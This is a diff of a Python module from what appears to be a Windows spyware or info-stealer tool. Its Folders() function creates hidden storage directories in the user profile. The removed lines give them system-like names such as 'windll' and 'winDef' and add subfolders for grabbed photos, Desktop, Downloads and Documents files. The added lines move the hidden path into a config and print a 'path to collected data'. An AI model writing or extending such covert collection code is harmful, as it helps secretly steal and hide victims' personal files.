@@ -11,29 +11,22 @@
 #-----------------------------------------------------------------------------#
 
 
-from os import environ, sep, makedirs
+from os import environ, makedirs
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32api import SetFileAttributes
+from preferences.config import config
 
 
-def Folders(fileGrab):
-    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+def Folders():
+    user = environ['USERPROFILE']
     try:
-        makedirs(rf'{pathf}\windll')
-        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
-        makedirs(rf'{pathf}\windll\Photos')
-        if not fileGrab:
-            makedirs(rf'{pathf}\windll\Files\Desktop')
-            makedirs(rf'{pathf}\windll\Files\Downloads')
-            makedirs(rf'{pathf}\windll\Files\Documents')
+        makedirs(f'{user}\\{config.pathToLogs}')
+        SetFileAttributes(f'{user}\\{config.pathToLogs}', FILE_ATTRIBUTE_HIDDEN)
     except:
         pass
-    try:
-        makedirs(rf'{pathf}\system\sysFiles\winDef')
-    except:
-        pass
-    f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
+    f = open(f'{user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}', 'w', encoding='utf-8')
     f.close()
-    print(f"path to error_log: {pathf}\system\sysFiles\winDef\log20742384.txt")
+    print(f"path to collected data: {user}\\{config.pathToLogs}")
+    print(f"path to error_log: {user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}")
 
 
